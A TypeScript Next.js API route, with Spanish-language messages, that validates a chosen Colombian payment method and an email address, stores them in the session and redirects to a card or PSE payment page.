import { NextRequest, NextResponse } from "next/server";
import { readSessionFromReq, writeSession } from "@/lib/session";

const METODOS = ["TARJETA", "PSE", "BANCOLOMBIA", "NEQUI"] as const;
type Metodo = (typeof METODOS)[number];

export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => null);
  if (!body) {
    return NextResponse.json(
      { ok: false, errors: { form: "Cuerpo inválido." } },
      { status: 400 }
    );
  }

  const metodoPago = String(body.metodoPago || "").toUpperCase();
  const email = String(body.email || "").trim();

  if (!METODOS.includes(metodoPago as Metodo)) {
    return NextResponse.json(
      { ok: false, errors: { form: "Por favor elige un metodo de pago" } },
      { status: 422 }
    );
  }

  if (!email) {
    return NextResponse.json(
      { ok: false, errors: { email: "El correo es obligatorio" } },
      { status: 422 }
    );
  }
  if (!email.includes("@") || !email.includes(".")) {
    return NextResponse.json(
      { ok: false, errors: { email: "Ingresa un correo válido" } },
      { status: 422 }
    );
  }

  const session = await readSessionFromReq(req);
  if (!session.telefono) {
    return NextResponse.json(
      { ok: false, errors: { form: "Sesión expirada." }, redirect: "/mov" },
      { status: 422 }
    );
  }

  const redirect =
    metodoPago === "TARJETA" ? "/pago/tarjeta" : "/pago/pse";

  const res = NextResponse.json({ ok: true, redirect });
  return await writeSession(res, {
    ...session,
    error: false,
    metodoPago: metodoPago as Metodo,
    email,
  });
}
